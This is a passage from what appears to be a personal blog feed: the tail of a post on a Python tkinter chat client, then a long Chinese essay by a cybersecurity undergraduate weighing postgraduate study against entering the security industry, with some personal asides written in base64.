class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> message<span class="token punctuation">.</span>__len__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">recvdata</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        theTime <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        new_message <span class="token operator">=</span> message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span>   new_message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' ['</span> <span class="token operator">+</span> theTime <span class="token operator">+</span> <span class="token string">'] ：\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>itemconfig<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string">'  '</span> <span class="token operator">+</span> new_message<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>see<span class="token punctuation">(</span>END<span class="token punctuation">)</span></code></pre><p>在实现关闭程序时，借助了close()函数，关键代码为： </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="回顾与展望"><a href="#回顾与展望" class="headerlink" title="回顾与展望"></a>回顾与展望</h3><p>通过本项目使我的代码能力和纠错能力得到了进一步提升，尤其是在独立面对困难和程序bug的时候多多调试就可以解决问题，并且记录下来，这样对我的学习非常有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> Programme </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于考研</title>
      <link href="article/postgraduate/"/>
      <url>article/postgraduate/</url>
      
        <content type="html"><![CDATA[<p>也许这是每个大学生都会面对的吧</p><p>长篇文字预警</p><span id="more"></span><p>作者：<a href="https://err0r.top/">https://err0r.top/</a></p><h2 id="前言·Introduce"><a href="#前言·Introduce" class="headerlink" title="前言·Introduce"></a>前言·Introduce</h2><p>又是半载春秋，俺已经进入大学两年半了，经常有人问“到底要不要考研？”，“你准不准备考研？”种种，如今网安形势还算不错，前几天的log4j至少能让一部分人免于被裁23333，就来谈谈自己的看法和想法吧。往往一谈到考研就会很emo，话题也不由得变得沉重，所以偷偷看看，晚上感性地思考，白天理性地决定(开玩笑)。</p><p><del>说实话，我是没有考研的想法的，一句话，实力不够，考不上。</del>经过深入了解后，有点变化，下面道来。</p><p>我一直觉得干技术吃这口饭要的是实践经历，工作经验和技术水平。学校教的理论和基础知识与实践几乎没多大关系，或者说只有教学大纲那么多的知识，这与个人学校还有教师都离不开关系，这些也是身边大部分人的想法。</p><p>就我本人而言，证书拿了不少，成绩也还算可以，按照前辈的情况去找个不错的工作是不成问题的，主要在于个人，其实只要在校认真学习，课外不要天天王者吃鸡，自己研究研究代码等，就已经超出同届学生很多了。</p><p>个人觉得首先对自己有个明确的定位，对自己的未来有个规划，对考研的情况有所了解，综合之后再做决定才是最佳选择。</p><h2 id="因素·Factor"><a href="#因素·Factor" class="headerlink" title="因素·Factor"></a>因素·Factor</h2><h3 id="工作-or-考研"><a href="#工作-or-考研" class="headerlink" title="工作 or 考研"></a>工作 or 考研</h3><p>当前社会可能对于学历的要求越来越高，尤其是国企，当然这是社会上普遍的想法。每年秋季三大热潮，入学潮，面试潮，考研潮，就个人经历，目前大三上课，课间已经有多次校内合作考研机构来班上宣传，加上家里长辈的催促，极其容易让人产生大学毕业必须考研的想法。</p><p>求仁得仁，求志得志。人与人之间，所处环境不同导致观念不同进而导致选择不同。在写这篇文章前我咨询了很多师傅，有师傅说他工作一年以后确实有点后悔没有考研，出于自我提升，尤其对于专业知识的热爱引发的钻研，很热爱自己的领域学习，是考研的最佳动力。</p><h3 id="学习动力哪里来"><a href="#学习动力哪里来" class="headerlink" title="学习动力哪里来"></a>学习动力哪里来</h3><p>根据延迟满足能力的差别，人可以分为两类：一类人延迟满足能力较强，我们把这类人叫做目标驱动型；另一类人延迟满足能力较弱，我们把这类人叫做任务驱动型。</p><h4 id="目标驱动型"><a href="#目标驱动型" class="headerlink" title="目标驱动型"></a>目标驱动型</h4><p>目标驱动型的人可以盯着一个需要几年努力才能实现的目标努力，比如高考，考研。说到目标驱动型，不得不说至少高中都是天天这样强调的，<del>拼搏百天，我要上xxxxxxxx大学，</del>任何一件事，如果对你很重要，你大脑里自然会给它排很高的优先级，你的感觉会告诉你这个事情要抓紧完成。这时候，你自然希望一鼓作气把这个事情做完。只是，有的事情给你的心里负担太重了，你不愿意开始。所以，要制定一系列小目标，是为了拿掉你的心里负担，引导你很容易的进入状态，一步一步前进。</p><p>在写这篇文章前，我只是想完成这篇文章，但写这样一篇文章非常不容易，要兼顾各方面，还怕被人骂…然后再进一步发现，这篇文章所需要的铺垫太多了，从构思到完成这篇文章花了半个多月。我询问了身边十几位熟悉的朋友，采访了很多大师傅，发现有点麻烦，又做了份问卷分发，收回数据分析，再敲定写文章，有时候时间不够第二天接着写，就会恍惚，会容易胡思乱想，所以下面可能会看出来文风明显不同，这也是目标驱动型存在的问题。不自觉的想停下来胡思乱想，做些于完成目标毫无益处的事情，也就是休闲。最糟糕的是，休闲的时候，伴随着一些罪恶感，觉得在浪费时间。这样的后果就是：休闲的时候惦记着做事，做事的时候又想去休闲，都不快乐，都没有做好。</p><p>举个可能不恰当的例子，说白了目标驱动就是考完试不告诉你成绩，期末再公布。任务驱动型就是考完试直接出成绩。</p><h4 id="任务驱动型"><a href="#任务驱动型" class="headerlink" title="任务驱动型"></a>任务驱动型</h4><p>现在大学教育基本都是任务驱动型教育，当然大部分人也习惯了任务驱动型学习。“任务”是生活的基本形态，这个任务包含了三点：有意思，有意义和有可能。</p><p>在大学生活里，尤其是计算机学院的，往往都有n门课设(这里不是说其他学院没有)，很多课设，给了很多要求，要你去实现目标，但是老师基本上已经给你规划好了，所以最后基本上跟着做总能完成。而大创(大学生创新创业项目)就不同了，很多目标都是一个朦胧的影子，如果你是任务驱动型的，想做一件重要事，就最好提前问自己三个问题：</p><blockquote><ol><li>我喜不喜欢这件事?</li><li>(宏观上)这件事对我重不重要?</li><li>(尽力后)这件事我能不能做到?</li></ol></blockquote><p>从理论落实到现实，把知识落地到具体任务，学习起来，才会会更真实，更有动力。</p><h3 id="计算机专业-特殊专业？"><a href="#计算机专业-特殊专业？" class="headerlink" title="计算机专业 特殊专业？"></a>计算机专业 特殊专业？</h3><p>技术圈其实一直是一个特别的圈子，就比如说修车工人，计算机码农和修车工人又有什么区别呢？归根到底都是靠技术吃饭，除非是研究新的工具或者研究新的系统。大部分人来说都是一样的，更可以说，网安专业和其他专业有着完全不同的区别，这也是长辈们和圈外人不理解的一点。“凭什么一个大专出身的小伙子就能拿年薪上百万，而外面博士硕士还找不到工作？”至少在现阶段本科期间，其他专业没法通过除学历外更加强有力的标志来证明个人的能力，但计算机专业不同，计算机类专业除了学历外还可以通过技术水平来判断个人能力，计算机类很多学科竞赛，算法&#x2F;编程&#x2F;安全&#x2F;计算等等都可以证明这类人的能力。所以说技术水平才是决定这类人的上限而不是学历，这也是“师傅”尊称的由来，靠技术吃饭。</p><h3 id="行业现状"><a href="#行业现状" class="headerlink" title="行业现状"></a>行业现状</h3><p>安全行业整体起步才没几年，多数企业因为资源投入和建设时间原因导致覆盖面和深入度都不够，这其中甚至包括一些国内大厂，并没有想象的那么安全。大部分厂商的安全水平仅能应付一些白帽子级别，针对专业黑客团伙持续定向攻击，基本上都不能防御住。</p><p>安全是一个小圈子，圈内事件传播十分迅速，比如哪家企业数据库泄露、哪家业务活动被薅羊毛、哪个安全人被抓、哪个企业遭到了什么处罚等负面新闻。圈内人能够很快了解到行业新技术、新方向、新政策，能够很容易了解到每家公司的安全建设情况。你能了解到阿里安全与线下公安配合的手段之强，也能认识到腾讯的SRC如何能够运营的的这么好，更能和百度的安全人讨论如何让机器学习赋能安全产品，这一切场景在安全圈内的实现都非常容易。众多安全会议的举办也能让你学习到每家公司的经验，无需自己摸索、闭门造车。这都是小圈子的好处。当然弊端也很明显，总有一些人搞所谓的“圈子文化”，混迹于各种安全会议主动认识圈内人（当然这里不是指各家SRC运营的同学，这些是运营同学的工作一部分）。结识所谓圈内人如果出于交流技术的目的也能理解，但这些人仅仅是加上微信，发送一条打招呼的自我介绍后就再也不会有任何有意义的交流。妄图以这样的方式让自己进入圈子中心，真是离谱，这也是外行所看的“安全娱乐圈”。</p><h3 id="人才缺口"><a href="#人才缺口" class="headerlink" title="人才缺口"></a>人才缺口</h3><p>现在市面上都知道计算机专业的优势，未来是数据的时代，区块链，元宇宙，近年的扩招和宣传使得大量人涌入计算机专业。我曾问过班上一位同学为什么要读这个专业，他直接回复我因为听说这个专业赚钱多。慢慢的开始趋于饱和，很多人一听到计算机就觉得是搞算法的，其实不然，这就是网安专业新兴的地方。当然也不是说网安专业就不搞算法，近几年网安专业开始推动，很多院校才获批此专业，<small><del>比如我们学校天天吹(非贬义)全省第三家获批网安专业</del></small>其实是很强的，这里开个玩笑。网安专业属于<strong>特殊技术专业</strong>，高水平人才很难培养，而且社会需求极大（感谢log4j2又救活一批安全工程师），国家认可度提升，综上所述产生了很多<strong>专业红利</strong>。</p><p>互联网大厂<strong>大部分</strong>目前对于安全岗没有很高的学历要求，目前<strong>专业红利</strong>还在，而且大厂安全部门很难找到符合条件的网安人才，只要你技术水平优秀即使是本科学历，加上目前多方内推渠道，很容易就能通过简历筛选进入面试，而技术水平过硬但本科院校不太好的同学基本上只要通过简历筛选就已经成功了，所以技术大佬根本不需要担心院校较差的问题，而且很多大厂的定薪都是根据面试表现来的。了解到薪资等级在某网上称作白菜，sp，ssp三种，而本科生和研究生标准其实一样，并不会因为学历而提高或降低，还是以技术说话。</p><p>讲点实际的，应届信安专业优秀本科生能拿到<strong>每月</strong>20k-35k（数字没有打错，当然这里面有很多行业内卷的因素，一些公司的招聘策略是入职即巅峰，后面薪资就不怎么涨了），努力工作三四年的能拿到40k每月，做到安全团队管理者后能拿到百万年薪，做到行业顶尖能拿到千万年薪。</p><p>有这样的缺口好处是会有更多的人投身于安全，当然坏处也很明显，人员空缺与岗位的紧急程度导致存在大量能力良莠不齐的人在行业内浑水摸鱼，明显的特征是你跟他聊技术细节他跟你聊推进落地，你跟他聊推进落地他跟你聊方向把控，你跟他聊方向把控他跟你聊团队管理，你跟他聊团队管理他跟你聊行业空间，如果这些方面都能聊一点那也行，更多人是答非所问或者看似句句在理实际空洞无物，更有甚者，不知在何处听到的理论还没消化完毕，就拿出来班门弄斧。虽然这么说会得罪一部分人。有人问难道入职后不能衡量出来吗？正常老板不懂的情况下，还真不能衡量出来，主要是因为前面讲到的安全水位难以衡量，而实际的安全风险都是小概率事件。</p><p>很多事情是有因果关系的，前面讲到的良莠不齐的根因在于很难通过结果来判断安全建设的水位。很多团队的KPI是不出安全事故——当然什么事都不做也不会出安全事故，于是造就了吹嘘拍马之人的风生水起。</p><h3 id="“应用型”本科"><a href="#“应用型”本科" class="headerlink" title="“应用型”本科"></a>“应用型”本科</h3><p>所以就在校内外战队还有认识的大部分师傅都是早早就开始实习工作，早点积累工作经验，为提升自己技术水平而成长。目前国内大学教育于实践严重脱节，虽说近几年教育开始改革但目前很难看出成效。就我们校网安专业而言，20级是第一批网安专业，目前专业课程对于实践知识的教育少之甚少，目前还没有大三课程所以无法点评，也许是大一大二为打两年基础。以我个人网络工程专业举例，我届安排个人觉得不是太合理，大三上直接塞三门语言课，网络工程在大三教华为eNSP组网，最后课设要求合理规划并配置一个学校内网，以课内基础内容来组大型网络，书上的内容实在太少，专业知识几乎来自自学。</p><p>也许是我们高校“应用型”大学的培养，对于网络安全的教育更是纸上谈兵，我希望未来我们的学校能够发展得更好。很多学校的技术佬在大三甚至大二就开始了实习<del>(现在还有初中生小学生组卷CTF，太离谱了hhhh)</del>，目的就是趁早接触专业实践的内容。</p><p>6L+Z6YeM5bCx5LiN5o+Q5bWM5YWl5byP5LiT5Lia5LqG77yM5omA6LCT5bWM5YWl5byP5bCx5piv5q+P5bm05aSa5Lqk5Yeg5Y2D5a2m6LS55aSn5Zub57uZ5L2g5Y675p+Q5ZCI5L2c5YWs5Y+45b2T5Yqz5bel77yM546v5aKD6L6D5beu77yM5bel6LWE5bCx5piv55m96I+c6YO95LiN5aaC6YKj56eN77yM576O5ZCN5YW25puw56ev57Sv57uP6aqM77yM5a6e6ZmF5bCx5piv5buJ5Lu35Yqz5Yqo5Yqb44CC</p><p>据字节论坛是否读研帖子下高赞回帖，本科生和研究生定薪标准是一样的，而本科开始工作的话，在其他同学研究生毕业时已经拥有至少三年的工作经验，对于互联网厂来说，三年工作经验无论是跳槽或者调薪（大部分厂一年1-2调）足以让自己的薪水提至少一半，并且在步入社会一段时间后，<strong>基本</strong>没人会关注你的院校，而是关注你的<strong>工作经验</strong>，做过的<strong>项目</strong>等。</p><h3 id="专业红利"><a href="#专业红利" class="headerlink" title="专业红利"></a>专业红利</h3><p>专业红利不仅仅在大厂体现，在体制内也有体现，目前全国各地公安都有对于网安人才的技术人才特招，符合要求的技术人才可以不用考行策，直接技术考核通过就可以进入公安编制。包括一线城市二线城市，而这类特招还很多时候还招不到人。这类单位技术人员基本都是找的外包，本单位技术人员基本上都是之前做过计算机或计算机相关专业掉过去，厉害的技术人员很少，尤其是网安人才，更是这类单位极度渴望的。</p><p>就我之前个人发布的一个问卷，得到的结果是计算机专业工作经验绝对大于学历，毋庸置疑。所以网安专业的特殊性加上目前的专业红利，很多师傅选择本科就毕业直接就业大厂或者进体制都是很不错的。</p><p>安全圈存在很多<strong>无学历或低学历</strong>的牛人，他们年龄可能不大、工龄也短，但往往都是兴趣驱动行动，早期就在安全方面投入了大量时间精力，因此颇有造诣。当长处特别突出时，往往会突破企业的一些要求限制，比如岗位学历要求本科时，候选人突出的安全能力能让这项要求降低。同时也必须正确认识低学历对工作带来的影响，在当前安全行业逐渐细分、安全建设越来越深入的趋势下，安全从业者不再只是会挖漏洞就行。建议低学历候选人尽早通过自考的方式系统的学习英语、数学、计算机基础等学科，并获得国家认可的成人教育学历，届时学历问题的影响就不再会是问题。当然，随着大量院校开设信安专业，越来越多的人进入到安全行业，后续企业招聘安全人才时，学历要求肯定会和其他行业一样成为基础筛选要求。</p><h2 id="形势·Situation"><a href="#形势·Situation" class="headerlink" title="形势·Situation"></a>形势·Situation</h2><p>近几年形势来看，网安考研难度一直小于计算机，但差距在逐步缩小。国家首推网络安全，2022考研形势严峻，一大批网安本科生即将毕业，自从16年以后考研的人数逐年攀升，而计算机、控制、自动化又是工科里的热门专业，在这些学科里还想考重点院校，难度可想而知，所以还是要合理看待考研。以下分析均来自各位师傅，有很多人的意见和看法，我做了很多笔记，在此不能一一列举各位师傅，非常感谢各位师傅提供的帮助。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>研究生分为博研和硕研，博研是要继续深入，侧重于理论和研究方面；硕研三偏向于技巧，更多是面向工作方面，据师傅说大部分都是硕研，多半考上后一两年就工作去了。而导师也是不同的，导师的选择也是重要的一个方面，也不用看电视上讲某某大学研究生因导师太过xx而怎么怎么样，这只是极个别的，大多数导师都是很不错的，不能因为个例而去否认一个群体。</p><h3 id="相关情况"><a href="#相关情况" class="headerlink" title="相关情况"></a>相关情况</h3><p>每年12月25日左右进行考研初试，根据每个学校考研的科目不同分数也不同，网络安全例如哈工大，满分500分，分为数学(150分)，英语(100分·不考听力)，政治(100分)，还有专业课(150分)。</p><h4 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h4><p>数学150分，分为数一数二数三，其中高等数学均考察，且所占比重最大，数一数三中所占比例56%，数二达到了78%。</p><p>数一包括高数上下，线性代数和概率论，数二不考概率论，一般不考数三 &#x3D; &#x3D;。</p><p>21级填空选择分值由4分增加至5分。</p><h4 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h4><p>英语分英一英二英三，从难到简单，各类型题目占比不同。</p><p>完形填空10分，阅读40分，新题型10分</p><p>翻译英一10分，英二15分</p><p>写作小作文10分，英一大作文20分，英二大作文15分</p><p>插曲：在向我一位室友询问考研情况时我做了他一套考研英语卷，就举单选的栗子，感觉都明白句意，但是选项的词意不明白，个人感觉。</p><p>就前期发布的问卷和询问的结果而言，英语六级是接近考研英语的水平，但是考研英语稍微难一些，如果四级都没过的话一定要重视英语，真的没那么简单。不恰当的比较：差不多英语六级425&lt;&#x3D;考研60，四级都没过去考研纯属就是去玩玩的，这是个很不负责的比较，会得罪很多人，很抱歉我没有其他意思，就是希望大家重视一下英语，勿喷&#x3D; &#x3D;。</p><h4 id="专业课"><a href="#专业课" class="headerlink" title="专业课"></a>专业课</h4><p>有很多代名词，比如408，837，分别指考的科目，具体意义就是科目对应的编号</p><p>举20级哈工大网安研究生例子，837考试，考试时间180分钟，150分。包括计算机网络（60分）、信息安全基础（45分）和网络安全基础（45分）三个部分。</p><p>难度 计网 &gt; 信安基础 ≈ 网安基础</p><p>21级工大本部网安缩招，仅招收11人，过复试线15人</p><p>再举408考试例子，科目数据结构，计算机组成原理，计算机网络基础，操作系统。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先，当然我是在纸上谈兵，直言，因为在写这篇文章前我没有考研打算，为了写这篇文章做了很多调查，询问了很多师傅。</p><p>以下言论皆为妄言，我本人说话较直，所作所为皆为后代学弟学妹参考，为其发展考虑，绝无他意，望各位明白，言语不当之处望各位谅解，抱歉了。</p><p>我觉得，考一个非985&#x2F;211的普通一本研究生是比较容易的，考研学校专业的难易度与其名声非正比，比如北航计算机专业分贼高，因为它就收比如说10人，你报了一堆人，那也只能取这么多，所以分数线就高了。比如说我分低，但我报的学校专业没人报，那你就捡了漏，所以说也是有一定运气成分。</p><p>举个19级前辈的例子，六级大二425压线过，第一次考研失败，第二次初试复试第一388上了哈工大信息安全专业，专业课837考了135分。</p><p>21级网安国家线263分，而某大学21级网安空间安全专业考政治，数一，英一和807，复试数据结构，招生21人，复试线就是263分，当年录取最低分264分，最后招入9人，因为只报了9个人…因为没人报所以分数非常低。</p><p>来算一帐，假使英语六级飘过水平，英语政治全考60，数学考低点考个100分，这样已经220分了，专业课满分150分只要考44分就足够了，当然这是我在吹牛，只是想说如果平时成绩不错的话考个一般本科研究生其实是比较容易的，当然是纸上谈兵，还得看个人。</p><h2 id="我为什么-之前-不打算考研"><a href="#我为什么-之前-不打算考研" class="headerlink" title="我为什么(之前)不打算考研"></a>我为什么(之前)不打算考研</h2><p>以下都是个人的自我分析</p><p>看门见山，我一直秉持着之前提到的看法，本科毕业有一定能力进入一家企业单位就可以工作，计算机专业不愁找不到工作，都是在为更好的生活而努力，而且就计算机专业的要求而言，技术水平，能力，经验大部分来说是大于学历的。从长远来说，高学历可能以后会有一定的优势，不过那是未来目标考虑的了。</p><p>如果考研的话，势必要浪费掉半年到一年的时间，而计算机专业几个月甚至不到一月不碰代码可能就已经落后一步了，半年可能已经落后一个时代了(计算机内的时代)。</p><p>一个重要的点：考不上(此点后续会再说)。人分两类，一种是适合学习的，另一种是适合在工作中学习的。就像之前的两类人，一种是目标驱动型的，一种是任务驱动型的，我之前自我定位是任务驱动型的，可能 在企业里完成一个个任务，做一个个项目，这样提升自我可能会更快一些，又可以不让自己那么痛苦，拖着自己的事情却不做，内心十分痛苦。当然也不是说任务驱动型不适合考研，只是目标驱动型在大学内完成一个个目标，为一个个目标而奋斗努力，甚至可以盯着一个需要几年努力才能实现的目标努力，我是十分羡慕这样的人的。(拖延症的内心痛)</p><p>第二个重要的点：生活中诱惑太多。如果我能考上211大学，那我肯定会上的，但是我觉得我考不上这种比较好的研究生。不是说智商不行或者是学习能力不行，而是我的生活中有太多考研之外的事，来分摊我的时间与精力。比如我网工专业往往都是全天满课，很难抽出时间复习，我平时喜欢写写自己的项目，看看最近的实事，最新的漏洞，最近的比赛，还要打最近的比赛，做项目，做课设，写报告等等等等。很多事情都是有周期的，对于年轻人来说一年半载的时间就会让自己和以前的自己完全脱节，习惯是很久养成的，就算你告诉我这些习惯不好，我也不会相信。或者我心里愿意放弃这些，努力考研，但是肉体上也做不到，如果我奔着211大学去了，就要放弃这一切，就我的水平可剩下的时间都不够，况且还有其他的安排。</p><p>我相信一个人的知识水平是一点点积累起来，而不是用一段时间革自己的命，不是用两年时间换一个研究生再享乐，在安稳的玩。研究生是留给那种能长时间在一个专业钻研的人上的，我不是。</p><p>第三个重要的点：考上了又如何(非杠)。作为一个计算机专业的学生，我还是希望我是做一个综合性人才而不是专才，当然我可能也没能力做 &#x3D; &#x3D;。我在各个领域都有一些好奇心，但是还达不到能做学问的程度。有人说现在研究生出来都找不到工作，计算机专业可并非如此，网安方面更是，只要你敢说你是搞网安的，就有人敢要你。</p><p>第四个点：高学历不一定有那么重要。就像我之前说的，科技进步大背景下，社会变动大，你入职场一定时间后并不会有过多人关注你的学历，而是关注你的经历和能力。</p><p>现在所拥有的可能会是未来前进路上的绊脚石，再好的学校也有摆烂的，再差的学校也有优秀学生，本科生和研究生在这上面是没多大区别的，只是一个群体的概念。</p><h2 id="我为什么动摇了"><a href="#我为什么动摇了" class="headerlink" title="我为什么动摇了"></a>我为什么动摇了</h2><p>此部分在我写这篇文章前根本不存在…</p><p>乞儿求温饱，商贾祈财亨，王公祭祚希万世千秋。若把以上三个例子的选择打乱随机分配，估计有的会饿死，有的会造反，有的被杀头。所处环境不同导致观念不同进而导致选择不同。</p><p>以下所说的皆为真心所言。</p><h3 id="情况"><a href="#情况" class="headerlink" title="情况"></a>情况</h3><p>随着我不断深入调查考研情况和学校情况，我发现 我所处的境地有些糟糕…</p><h4 id="我有什么考研的理由"><a href="#我有什么考研的理由" class="headerlink" title="我有什么考研的理由"></a>我有什么考研的理由</h4><ol><li>学校差距</li></ol><p>我们学校是三流民办本科，并不是说它不好，我们学校聘请了很多东南等大学的老师来上课，师资力量还是很雄厚的，我很感谢学校给了我优质的学习环境。</p><p>5o2u5oiR6LCD5p+l55qE5oOF5Ya177yMMjHlubTmiJHku6zpmaLlhbHlm5vnmb7lpJrkurrogIPnoJTvvIzmnIDlkI7ku4XmnIkxNOS6uuiAg+S4iu+8jOiAjOWFtuWunuato+W4uOaZrumAmuS4gOacrOW5tuS4jeaYr+WkqumavuiAg++8jOW+iOWkmuadpeeahOWtpuagoeeahOaWsOeUn+mDveaYr+S4jeW+l+W&#x2F;l+eahOagt+WtkO+8jOWmguaenOaDs+aPkOWNh+iCr+WumuS4jeS8muaUvuW8g+i&#x2F;meadoei3r++8jOWPquacieS4pOenjeino+mHiu+8jOS4gOaYr+ayoeacieWvueiHqui6q+iDveWKm+WBmuWQiOeQhueahOivhOS8sO+8jOS6jOaYr+Wbm+W5tOaUueWPmOS6huS4gOS4quS6uueahOS5oOaAp+OAgueci+WIsOi&#x2F;meaIkeehruWunua3sea3seaEn+WPl+WIsOS6humZouagoeeahOW3rui3ne+8jOi&#x2F;meS5n+aYr+WKqOaRh+aIkeaDs+azleeahOacgOWkp+WboOe0oOS5i+S4gOOAgg&#x3D;&#x3D;</p><p>所以我还是想提升一下自己的学历，哪怕只是一个普通的一本研究生。</p><ol start="2"><li>成绩还行</li></ol><p>我个人成绩还行，有一定的自律性，平时上课比较认真，英语六级425压线过，数学一般，专业课不错，也拿过校奖学金。学科竞赛的话在网安方面 校级省级国家级国际级都拿过奖，虽说不多，但是应该是足够的，可以拼一拼。</p><ol start="3"><li>普通一本研究生不是太困难</li></ol><p>根据我的调查，有不少一本大学研究生网安专业只要过国家线就要你，就我纸上谈兵算一下是很有希望的，如果我不冲211这样的名校，只是为了提升最终学历，我觉得是很不错的选择。网安专业正处于专业红利当中，大量院校正在扩招，很多其他专业的考生（跨考生）并不知道，分数相比于传统计算机专业来说非常低，而随着考研逐年越来越难的趋势，赶紧通过网安专业上岸一个名校可谓是机不可失时不再来。</p><ol start="4"><li>资源吸引</li></ol><p>和圈子内的很多师傅聊聊，发现他们的学校设备环境之类的都比我们要好，我们学校在同等次学校内的环境已经算上等了，但是我希望能找到个更好的环境，认识更多的师傅，加上硬件资源，导师资源，人脉资源等等。做技术的不能只关注于技术，拓展其他领域其他专业的人脉也是个人发展不可或缺的一部分。</p><ol start="5"><li>环境影响</li></ol><p>卷王太多了 &#x3D; &#x3D;。被环境带的…其实是在校外我认识了很多大师傅，包括打比赛认识的，社会战队队伍内的等等，尤其是在社会联合战队内，结识到了全国各地志同道合的优秀师傅们，然而接触到的人多了自然也就加深了我对他们学校的印象，我发现他们很多的院校非常的优异，师傅们的实力也很强劲，我个人的院校较为普通，所以我也想去名校看看。</p><ol start="6"><li>圈外的认可</li></ol><p>虽说很不情愿，但受家人和亲戚朋友的影响，都属于圈外人，他们不搞技术，评判你往往都是根据你的院校来判断，虽然我并不是很在乎他们的眼光，也不在意要不要获取他们的认可，但是如果有可能的话，可以为我带来更多机遇，这是工作无法带来的资源和优势。</p><h4 id="我有什么顾虑"><a href="#我有什么顾虑" class="headerlink" title="我有什么顾虑"></a>我有什么顾虑</h4><ol><li>校内情况</li></ol><p>目前我是我校网安战队队长，所承担的事务繁重，我还在校外负责一个社会联合战队的事务，校外战队可以和师傅们商量一下，师傅们也会理解，校内的情况很不好办，况且这届情况有些不好，很可能会滑铁卢，我个人集体荣誉感比较重，不太能放心。(老师也不可能放过我&#x3D; &#x3D;，开个玩笑，我们这届没什么拿得出手的强项，我都是校队web的顶梁柱，太菜了)</p><ol start="2"><li>技术</li></ol><p>考研就意味着我至少半年可能不会再碰技术了，网安方面哪怕一个月，技术水平绝对会大幅降低跟不上圈子的发展，要花半年时间在应试教育上，我的技术能在<strong>之后</strong>跟得上吗？画个大大的问号</p><ol start="3"><li>风险</li></ol><p>考研是有风险的，我们学校没有保研名额，如果我没考上我的技术绝对跟不上时代，这是我无法接受的，万一我没考上怎么办？到时候进好一点的厂也是困难，我还能进我满意的公司吗？这又是个大大的问号</p><ol start="4"><li>社会因素</li></ol><p>研究生出来同学和朋友都已经工作买房实现财富自由了，可能会把我羡慕死（23333）。研究生我肯定会认真学习的，虽说我的考研目的就是为了提升学历，但我还是会努力完成学业，如果读研期间的导师很差怎么办？如果我的自由时间很少怎么办？读研出来专业红利没了怎么办？这些又是一堆问号</p><p>6L+Y5pyJ5bCx5piv55S35aWz5pa56Z2i55qE6Zeu6aKY77yM5L2c5Li655S355Sf77yM5pyq5p2l6IKv5a6a5b6X6LWa6ZKx5YW75a6277yM5YyF5ous5oi&#x2F;6LS36L2m6LS36L+Z5Lqb5pyJ5Lqb5LmF6L+c5bCx5YWI5LiN6K+077yM5aWz55Sf55qE6K+d56Gu5a6e5Y+v5Lul5om+5Liq5pyJ6ZKx5Lq65auB5Ye65Y6777yM6L+Z5qC35Lmf5Y+v5Lul5LiN55So5Yqq5Yqb5LqG77yM5byA546p56yR77yM5aaC5p6c6L+Z5q615L2&#x2F;5oKo5oSf6KeJ5LiN5oSJ5b+r5oiR5oOz5oKo6YOR6YeN6YGT5q2J77yM5oiR6L+Z6YeM5LiN5oOz5omT5ouz77yM5q+V56uf6L+Z5piv5a6i6KeC56S+5Lya6Zeu6aKY77yM5bC9566h5by66LCD55S35aWz5bmz562J77yM5L2G6Iez5bCR5Zyo6L+R5Luj56S+5Lya5LiK5peg5rOV5pS55Y+Y55qE5LiA5Lqb5Zug57Sg56Gu5a6e5a2Y5Zyo44CC5L2c5Li65oiR5Liq5Lq65p2l6K+077yM5pei54S25oiR5pyJ6IO95Yqb5oqK5ZG96L+Q5o6M5o+h5Zyo6Ieq5bex5omL6YeM77yM5oiR6IKv5a6a5LiN5oS&#x2F;5oSP5Lqk57uZ5LuW5Lq644CC5L2c5Li655S355Sf77yM5b6X5Li75Yqo5om&#x2F;5ouF6LW36L+Z5Liq6LSj5Lu777yM5om&#x2F;5ouF5aSq5LmF6L+c6YKj5bCx5b6X5YWI6ICD6JmR5Yiw6L+Z5LiA5bGC5Zug57Sg</p><ol 